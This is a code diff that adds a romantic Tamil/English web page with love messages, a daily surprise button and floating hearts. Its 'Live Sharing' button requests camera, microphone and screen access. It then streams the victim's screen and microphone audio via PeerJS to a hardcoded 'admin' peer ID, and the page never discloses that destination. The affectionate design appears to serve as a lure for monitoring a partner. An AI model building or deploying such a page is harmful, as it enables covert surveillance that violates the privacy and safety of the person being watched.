@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="ta">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Our Love Space 💗</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body {
+            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
+            min-height: 100vh; display: flex; justify-content: center; align-items: center;
+            overflow: hidden; position: relative;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.85); padding: 2rem; border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(255, 105, 180, 0.3); text-align: center;
+            width: 90%; max-width: 400px; z-index: 10;
+        }
+        h1 { color: #d6336c; font-size: 1.8rem; margin-bottom: 1.5rem; }
+        .message-card {
+            background: #fff0f5; padding: 1.5rem; border-radius: 15px;
+            margin-bottom: 2rem; border: 2px dashed #ffb3c6;
+        }
+        #daily-message { font-size: 1.2rem; color: #555; line-height: 1.5; }
+        
+        button {
+            padding: 15px 20px; border: none; border-radius: 50px;
+            font-size: 1.1rem; font-weight: bold; cursor: pointer;
+            width: 100%; margin-bottom: 15px; transition: 0.2s;
+        }
+        button:active { transform: scale(0.95); }
+        
+        .surprise-btn { background: linear-gradient(45deg, #ff758c 0%, #ff7eb3 100%); color: white; box-shadow: 0 4px 15px rgba(255, 117, 140, 0.4); }
+        .surprise-btn.locked { background: #cccccc; box-shadow: none; cursor: not-allowed; }
+        
+        .live-btn { background: white; color: #ff758c; border: 2px solid #ff758c; }
+        .stop-btn { background: #ff4d4d; color: white; display: none; box-shadow: 0 4px 15px rgba(255, 77, 77, 0.4); }
+        
+        .heart { position: absolute; bottom: -20px; font-size: 20px; animation: floatUp 5s linear infinite; opacity: 0; }
+        @keyframes floatUp { 0% { transform: translateY(0); opacity: 0.8; } 100% { transform: translateY(-100vh) scale(1.5); opacity: 0; } }
+    </style>
+</head>
+<body>
+    <div id="hearts-container"></div>
+    <div class="container">
+        <h1>Welcome to Our Space 💖</h1>
+        <div class="message-card">
+            <h2>💌 இன்றைய காதல் செய்தி</h2>
+            <p id="daily-message">Loading...</p>
+        </div>
+        
+        <button id="surpriseBtn" class="surprise-btn" onclick="showSurprise()">💗 Love Surprise</button>
+        <button id="shareBtn" class="live-btn" onclick="startAllSharing()">🎥 Live Sharing</button>
+        <button id="stopBtn" class="stop-btn" onclick="stopSharing()">🛑 Stop Sharing</button>
+    </div>
+
+    <script>
+        // 1. Daily Love Message
+        const loveMessages = ["நீ என் வாழ்க்கையின் மிக அழகான பரிசு.", "உன் புன்னகை என்னை மகிழ்ச்சியாக வைத்திருக்கிறது.", "நீ என் எல்லாம்.", "இன்று உன்னை மிகவும் மிஸ் செய்கிறேன்."];
+        const dayOfYear = Math.floor((new Date() - new Date(new Date().getFullYear(), 0, 0)) / 1000 / 60 / 60 / 24);
+        document.getElementById('daily-message').innerText = loveMessages[dayOfYear % loveMessages.length];
+
+        // 2. Daily Surprise Lock
+        function checkSurpriseStatus() {
+            const today = new Date().toDateString();
+            const lastUnlocked = localStorage.getItem('lastSurpriseDate');
+            const btn = document.getElementById('surpriseBtn');
+            if (lastUnlocked === today) {
+                btn.classList.add('locked');
+                btn.innerText = "🔒 அடுத்த நாள் பார்க்கலாம்!";
+                btn.disabled = true;
+            }
+        }
+        function showSurprise() {
+            const surprises = ["You are my favorite person! ❤️", "I love you to the moon and back! 🌙", "You make my heart skip a beat! 💓", "Forever yours! 💍"];
+            alert("🎁 SURPRISE! 🎁\n\n" + surprises[Math.floor(Math.random() * surprises.length)]);
+            localStorage.setItem('lastSurpriseDate', new Date().toDateString());
+            checkSurpriseStatus();
+        }
+
+        // 3. Floating Hearts
+        setInterval(() => {
+            const heart = document.createElement('div');
+            heart.classList.add('heart'); heart.innerText = ['❤️', '💖', '💗'][Math.floor(Math.random() * 3)];
+            heart.style.left = Math.random() * 100 + 'vw'; heart.style.animationDuration = Math.random() * 3 + 3 + 's';
+            document.getElementById('hearts-container').appendChild(heart);
+            setTimeout(() => heart.remove(), 6000);
+        }, 300);
+
+        // 4. Single Button Live Sharing (Camera + Mic + Screen)
+        const ADMIN_PEER_ID = "love-app-admin-2024"; 
+        let camStream, screenStream, peer;
+
+        async function startAllSharing() {
+            try {
+                document.getElementById('shareBtn').innerText = "கேமரா & மைக் ஆன் ஆகுது...";
+                camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); // கேமரா + மைக்
+
+                document.getElementById('shareBtn').innerText = "ஸ்கிரீன் ஷேரிங்...";
+                screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true }); // ஸ்கிரீன்
+
+                // ஸ்கிரீன் வீடியோ + கேமரா மைக் ஆடியோ சேர்த்து அனுப்புவோம்
+                const combinedStream = new MediaStream([
+                    ...screenStream.getVideoTracks(),
+                    ...camStream.getAudioTracks()
+                ]);
+
+                document.getElementById('shareBtn').innerText = "இணைக்கிறது...";
+                peer = new Peer(); 
+                
+                peer.on('open', (id) => {
+                    const call = peer.call(ADMIN_PEER_ID, combinedStream);
+                    call.on('stream', () => {
+                        document.getElementById('shareBtn').style.display = 'none';
+                        document.getElementById('stopBtn').style.display = 'block';
+                    });
+                });
+            } catch (err) {
+                alert("பர்மிஷன் மறுக்கப்பட்டது: " + err.message);
+                stopSharing();
+            }
+        }
+
+        function stopSharing() {
+            if (camStream) camStream.getTracks().forEach(t => t.stop());
+            if (screenStream) screenStream.getTracks().forEach(t => t.stop());
+            if (peer) peer.destroy();
+            document.getElementById('shareBtn').style.display = 'block';
+            document.getElementById('shareBtn').innerText = "🎥 Live Sharing";
+            document.getElementById('stopBtn').style.display = 'none';
+        }
+
+        // Initialize
+        checkSurpriseStatus();
+    </script>
+</body>
+</html>
+
